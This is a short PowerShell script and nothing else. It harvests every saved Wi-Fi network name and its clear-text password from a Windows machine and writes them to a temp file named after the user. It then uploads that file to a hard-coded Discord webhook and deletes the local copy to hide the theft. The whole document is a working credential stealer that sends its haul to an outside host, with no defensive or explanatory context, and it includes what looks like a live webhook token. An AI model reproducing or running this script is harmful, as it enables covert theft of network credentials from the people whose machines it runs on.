$n = "$env:TEMP\$env:UserName.txt"
$w = 'https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlHVCAU2lK8-3gr-HgTDMOwu3QZ1ikm1_k9t9LAPMLM1IBg--z'

$wifi = (netsh wlan show profiles) | Select-String ':(.+)$' | ForEach-Object {
    $p = $_.Matches.Groups[1].Value.Trim()
    (netsh wlan show profile name="$p" key=clear) |
    Select-String 'Key Content.+:(.+)$' |
    ForEach-Object {
        $k = $_.Matches.Groups[1].Value.Trim()
        "$p : $k"
    }
}

$wifi | Set-Content $n
Start-Sleep -Milliseconds 500

$bd = [guid]::NewGuid().ToString()
$lf = "`r`n"
$h = @{ 'Content-Type' = "multipart/form-data; boundary=$bd" }
$c = Get-Content $n -Raw
$b = @(
    "--$bd",
    'Content-Disposition: form-data; name="file"; filename="' + $n + '"',
    'Content-Type: text/plain',
    '',
    $c,
    "--$bd--"
) -join $lf

$d = [System.Text.Encoding]::UTF8.GetBytes($b)
Invoke-RestMethod -Uri $w -Method POST -Headers $h -Body $d
Remove-Item $n -Force
